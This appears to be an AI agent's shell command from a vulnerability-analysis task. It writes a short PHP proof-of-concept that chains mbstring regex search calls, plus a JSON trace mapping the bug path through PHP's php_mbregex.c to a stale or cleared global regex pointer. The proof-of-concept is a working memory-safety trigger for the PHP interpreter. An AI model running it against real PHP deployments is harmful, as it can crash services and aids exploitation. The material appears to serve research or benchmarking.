Running command: cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('', '2');
mb_eregi_replace('2', '', '');
mb_ereg_search_pos();
mb_ereg_search_regs();
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker primes the persistent search subject used by later mbregex APIs."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"A caller-supplied pattern is compiled into the search regex cache entry."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":467,"var":"rc","code":"rc = zend_hash_str_find_ptr(&MBREX(ht_rc), (char *)pattern, patlen);","note":"The compile helper consults the regex cache using only the raw pattern bytes as lookup key."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":472,"var":"MBREX(search_re)","code":"if (rc == MBREX(search_re)) { /* reuse the new rc? see bug #72399 */ MBREX(search_re) = NULL; }","note":"If the cache lookup hits the very object stored in search_re, the global pointer is cleared and left stale."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_pos)","line":1438,"var":"MBREX(search_re)","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The next search operation dereferences the now-stale global regex pointer."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1592,"var":"MBREX(search_re)","code":"if (MBREX(search_regs) != NULL && Z_TYPE(MBREX(search_str)) == IS_STRING) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"A follow-up regs query can drive named-group iteration through the same invalid global state and reach the memory-safety sink."}
]
EOF

